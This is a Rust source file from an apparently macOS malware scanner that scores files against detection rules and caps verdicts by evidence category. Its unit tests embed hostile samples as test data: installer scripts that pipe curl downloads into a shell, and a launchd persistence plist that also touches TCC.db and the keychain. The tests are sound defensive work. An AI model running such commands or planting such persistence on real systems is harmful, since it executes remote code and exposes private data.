//! Scan orchestration: runs the ruleset against a file and folds the results
//! into a `ScanResult`. This is the function `navctl scan` / `navctl rules
//! test` call directly and in-process — no daemon, no socket (§2).

use std::collections::HashSet;
use std::path::Path;
use std::time::SystemTime;

use crate::context::ScanContext;
use crate::model::{
    EvidenceConfidence, MatchedSignal, Recommendation, ScanCompleteness, ScanResult, SignalCategory,
};
use crate::rules::{default_ruleset, Rule, RuleOutcome};

pub const ENGINE_VERSION: &str = env!("CARGO_PKG_VERSION");

/// Score at/above which a verdict is tentatively "high" — the §5.1 invariant
/// below can still cap it to "medium".
const HIGH_SCORE_THRESHOLD: i32 = 45;
/// Score at/above which a verdict is "medium."
const MEDIUM_SCORE_THRESHOLD: i32 = 15;

pub fn scan_file(path: &Path) -> ScanResult {
    scan_file_with_rules(path, &default_ruleset())
}

pub fn scan_file_with_rules(path: &Path, rules: &[Box<dyn Rule>]) -> ScanResult {
    scan_context(&ScanContext::load(path), rules)
}

/// Scan bytes extracted from inside a container, without writing them anywhere.
/// See [`ScanContext::from_embedded_bytes`].
pub fn scan_embedded_bytes(
    label: impl Into<std::path::PathBuf>,
    content: Vec<u8>,
    truncated: bool,
    rules: &[Box<dyn Rule>],
) -> ScanResult {
    scan_context(
        &ScanContext::from_embedded_bytes(label, content, truncated),
        rules,
    )
}

/// Run a ruleset against an already-built context. The single place a
/// `ScanResult` is assembled, whatever the bytes came from.
pub fn scan_context(ctx: &ScanContext, rules: &[Box<dyn Rule>]) -> ScanResult {
    let mut signals: Vec<MatchedSignal> = Vec::new();
    let mut not_applicable_count = 0usize;
    let mut evaluated_count = 0usize;

    for rule in rules {
        match rule.evaluate(ctx) {
            Ok(Some(signal)) => {
                evaluated_count += 1;
                signals.push(signal);
            }
            Ok(None) => {
                evaluated_count += 1;
            }
            Err(RuleOutcome::NotApplicable) => {
                not_applicable_count += 1;
            }
            Err(RuleOutcome::Evaluated(_)) => {
                // Rules never return this from `evaluate`; handle defensively.
                evaluated_count += 1;
            }
        }
    }

    // Truncation is a global completeness fact, not something individual rules
    // track: a file read only up to the §-content cap (or a container member
    // whose extraction stopped at a §6.2 limit) was not fully examined, so it
    // can never be `Complete` even when every rule that ran found nothing.
    let completeness = if !ctx.readable() {
        ScanCompleteness::Indeterminate
    } else if ctx.truncated || not_applicable_count > 0 {
        ScanCompleteness::Partial
    } else {
        ScanCompleteness::Complete
    };

    let score: i32 = signals.iter().map(|s| s.weight).sum();

    let non_informational_categories: HashSet<SignalCategory> = signals
        .iter()
        .filter(|s| s.category != SignalCategory::Informational)
        .map(|s| s.category)
        .collect();

    let recommendation = classify(score, non_informational_categories.len());

    let confidence = confidence_for(&completeness, evaluated_count, not_applicable_count);

    ScanResult {
        path: ctx.path.clone(),
        score,
        confidence,
        completeness,
        signals,
        recommendation,
        engine_version: ENGINE_VERSION.to_string(),
        evaluated_at: SystemTime::now(),
    }
}

/// The §5.1 scoring invariant: a high-severity recommendation needs signals
/// from >= 2 non-informational categories. A high score from one category is
/// capped at "medium".
fn classify(score: i32, distinct_categories: usize) -> Recommendation {
    if score >= HIGH_SCORE_THRESHOLD {
        if distinct_categories >= 2 {
            Recommendation::NotifyAndSuggestQuarantine
        } else {
            Recommendation::Notify
        }
    } else if score >= MEDIUM_SCORE_THRESHOLD {
        Recommendation::Notify
    } else {
        Recommendation::NoAction
    }
}

fn confidence_for(
    completeness: &ScanCompleteness,
    evaluated_count: usize,
    not_applicable_count: usize,
) -> EvidenceConfidence {
    match completeness {
        ScanCompleteness::Indeterminate => EvidenceConfidence::Low,
        ScanCompleteness::Partial => {
            // Some rules didn't run (macOS-only checks off-platform, an FDA
            // gap — §10), but the ones that did had real evidence.
            if evaluated_count >= not_applicable_count {
                EvidenceConfidence::Medium
            } else {
                EvidenceConfidence::Low
            }
        }
        ScanCompleteness::Complete => EvidenceConfidence::High,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::rules::default_ruleset;

    /// Container-extracted content is scored on what it is, and the result
    /// keeps the label for the report (§5.5).
    #[test]
    fn embedded_bytes_are_scored_and_keep_their_label() {
        let script = b"#!/bin/sh\ncurl -fsSL http://198.51.100.9/x.sh | /bin/sh\n";
        let r = scan_embedded_bytes(
            "installer.pkg!Scripts/preinstall",
            script.to_vec(),
            false,
            &default_ruleset(),
        );
        assert_eq!(r.path.to_string_lossy(), "installer.pkg!Scripts/preinstall");
        assert!(
            r.signals.iter().any(|s| s.id == "suspicious-strings"),
            "content rules should still fire on embedded bytes: {:?}",
            r.signals
        );
    }

    /// Filesystem rules report `NotApplicable` for embedded content, so a
    /// container member never comes back as a `Complete` scan (§10, §11.8).
    #[test]
    fn embedded_content_never_reports_a_complete_scan() {
        let r = scan_embedded_bytes(
            "installer.pkg!Scripts/postinstall",
            b"#!/bin/sh\nexit 0\n".to_vec(),
            false,
            &default_ruleset(),
        );
        assert_ne!(
            r.completeness,
            ScanCompleteness::Complete,
            "signing/xattr cannot be checked on extracted bytes, so the scan is partial"
        );
        assert!(!r.signals.iter().any(|s| s.id == "unsigned-binary"));
        assert!(!r.signals.iter().any(|s| s.id == "quarantine-xattr-present"));
    }

    /// A single static artifact must not corroborate itself into a high-severity
    /// verdict: a launchd plist that trips both `launchd-persistence-plist` and
    /// `suspicious-strings` is two static reads of one file, not two independent
    /// evidence families, so it stays capped at `Notify` even past the high
    /// score threshold — both rules now share `StaticSuspicion` (NAV-002).
    #[test]
    fn one_static_artifact_cannot_reach_high_severity_alone() {
        let plist = br#"<plist version="1.0"><dict>
            <key>Label</key><string>com.x.updater</string>
            <key>ProgramArguments</key>
            <array><string>/bin/sh</string><string>-c</string>
              <string>osascript -e run; curl -s https://x.test/a | sh; sqlite3 TCC.db; SecKeychain</string></array>
            <key>RunAtLoad</key><true/>
            <key>KeepAlive</key><true/>
            <key>StartInterval</key><integer>10</integer>
        </dict></plist>"#;
        let r = scan_embedded_bytes(
            "com.x.updater.plist",
            plist.to_vec(),
            false,
            &default_ruleset(),
        );

        assert!(r
            .signals
            .iter()
            .any(|s| s.id == "launchd-persistence-plist"));
        assert!(r.signals.iter().any(|s| s.id == "suspicious-strings"));
        assert!(
            r.score >= HIGH_SCORE_THRESHOLD,
            "score {} must clear the high threshold for this test to be meaningful",
            r.score
        );

        let categories: HashSet<SignalCategory> = r
            .signals
            .iter()
            .filter(|s| s.category != SignalCategory::Informational)
            .map(|s| s.category)
            .collect();
        assert_eq!(
            categories.len(),
            1,
            "two static rules on one artifact must not present as independent families: {categories:?}"
        );
        assert_ne!(
            r.recommendation,
            Recommendation::NotifyAndSuggestQuarantine,
            "one static artifact must not reach the quarantine tier on category diversity alone"
        );
    }

    /// Truncation alone downgrades completeness: a readable file examined only
    /// up to the content cap is `Partial`, never `Complete`, even when no rule
    /// objected — otherwise content placed past the read boundary reads as
    /// absent (NAV-001 / §5.5).
    #[test]
    fn truncation_alone_prevents_a_complete_scan() {
        use crate::context::{ContentSource, ScanContext};
        use std::sync::OnceLock;

        let ctx = |truncated: bool| ScanContext {
            path: "big.bin".into(),
            content: Some(b"benign".to_vec()),
            truncated,
            file_len: Some(u64::MAX),
            identity: None,
            source: ContentSource::File,
            codesign_dv_cache: OnceLock::new(),
            spctl_cache: OnceLock::new(),
        };

        // No rules object, so truncation is the only thing that can lower it.
        let no_rules: [Box<dyn Rule>; 0] = [];
        assert_eq!(
            scan_context(&ctx(false), &no_rules).completeness,
            ScanCompleteness::Complete
        );
        assert_eq!(
            scan_context(&ctx(true), &no_rules).completeness,
            ScanCompleteness::Partial
        );
    }

    /// An extraction that stopped at a budget must not be scored as if the
    /// whole member had been seen.
    #[test]
    fn a_truncated_member_is_not_scored_as_whole() {
        let r = scan_embedded_bytes(
            "installer.pkg!Scripts/preinstall",
            b"#!/bin/sh\n".to_vec(),
            true,
            &default_ruleset(),
        );
        assert_ne!(r.completeness, ScanCompleteness::Complete);
    }
}
